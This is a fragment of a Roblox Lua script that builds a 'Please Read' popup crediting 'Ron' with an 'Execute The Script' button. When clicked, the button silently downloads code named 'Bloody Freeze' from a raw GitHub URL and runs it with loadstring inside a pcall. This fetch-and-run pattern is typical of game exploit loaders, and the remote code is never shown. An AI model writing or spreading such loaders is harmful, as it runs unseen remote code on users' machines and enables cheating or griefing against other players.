Title.Name = "Title"
Title.Parent = MainFrame
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0, 0, 0, 15)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Font = Enum.Font.GothamBold
Title.Text = "Please Read"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 20
Title.TextTransparency = 1

UpdateLog.Name = "UpdateLog"
UpdateLog.Parent = MainFrame
UpdateLog.BackgroundTransparency = 1
UpdateLog.Position = UDim2.new(0, 0, 0, 50)
UpdateLog.Size = UDim2.new(1, 0, 0, 20)
UpdateLog.Font = Enum.Font.Gotham
UpdateLog.Text = "Update at March 10"
UpdateLog.TextColor3 = Color3.fromRGB(180, 180, 180)
UpdateLog.TextSize = 14
UpdateLog.TextTransparency = 1

Author.Name = "Author"
Author.Parent = MainFrame
Author.BackgroundTransparency = 1
Author.Position = UDim2.new(0, 0, 0, 75)
Author.Size = UDim2.new(1, 0, 0, 20)
Author.Font = Enum.Font.GothamMedium
Author.Text = "This Script Was Made By Ron"
Author.TextColor3 = Color3.fromRGB(255, 255, 255)
Author.TextSize = 13
Author.TextTransparency = 1

CloseBtn.Name = "CloseBtn"
CloseBtn.Parent = MainFrame
CloseBtn.BackgroundTransparency = 1
CloseBtn.Position = UDim2.new(1, -35, 0, 10)
CloseBtn.Size = UDim2.new(0, 25, 0, 25)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.TextSize = 18
CloseBtn.TextTransparency = 1

ExecuteBtn.Name = "ExecuteBtn"
ExecuteBtn.Parent = MainFrame
ExecuteBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ExecuteBtn.Position = UDim2.new(0.1, 0, 0.7, 0)
ExecuteBtn.Size = UDim2.new(0.8, 0, 0, 40)
ExecuteBtn.Font = Enum.Font.GothamBold
ExecuteBtn.Text = "Execute The Script"
ExecuteBtn.TextColor3 = Color3.fromRGB(20, 20, 20)
ExecuteBtn.TextSize = 14
ExecuteBtn.AutoButtonColor = true
ExecuteBtn.TextTransparency = 1
ExecuteBtn.BackgroundTransparency = 1

ButtonCorner.CornerRadius = UDim.new(0, 8)
ButtonCorner.Parent = ExecuteBtn

local TweenService = game:GetService("TweenService")
local info = TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)

TweenService:Create(MainFrame, info, {BackgroundTransparency = 0}):Play()
TweenService:Create(UIStroke, info, {Transparency = 0}):Play()
TweenService:Create(Title, info, {TextTransparency = 0}):Play()
TweenService:Create(UpdateLog, info, {TextTransparency = 0}):Play()
TweenService:Create(Author, info, {TextTransparency = 0}):Play()
TweenService:Create(CloseBtn, info, {TextTransparency = 0}):Play()
TweenService:Create(ExecuteBtn, info, {TextTransparency = 0, BackgroundTransparency = 0}):Play()

CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

ExecuteBtn.MouseButton1Click:Connect(function()
    local fadeOut = TweenService:Create(MainFrame, info, {BackgroundTransparency = 1})
    TweenService:Create(UIStroke, info, {Transparency = 1}):Play()
    TweenService:Create(Title, info, {TextTransparency = 1}):Play()
    TweenService:Create(UpdateLog, info, {TextTransparency = 1}):Play()
    TweenService:Create(Author, info, {TextTransparency = 1}):Play()
    TweenService:Create(CloseBtn, info, {TextTransparency = 1}):Play()
    TweenService:Create(ExecuteBtn, info, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
    
    fadeOut:Play()
    fadeOut.Completed:Connect(function()
        ScreenGui:Destroy()
        task.spawn(function()
            pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/venux83h/Bloody/refs/heads/main/Bloody%20Freeze"))()
            end)
        end)
    end)
end)
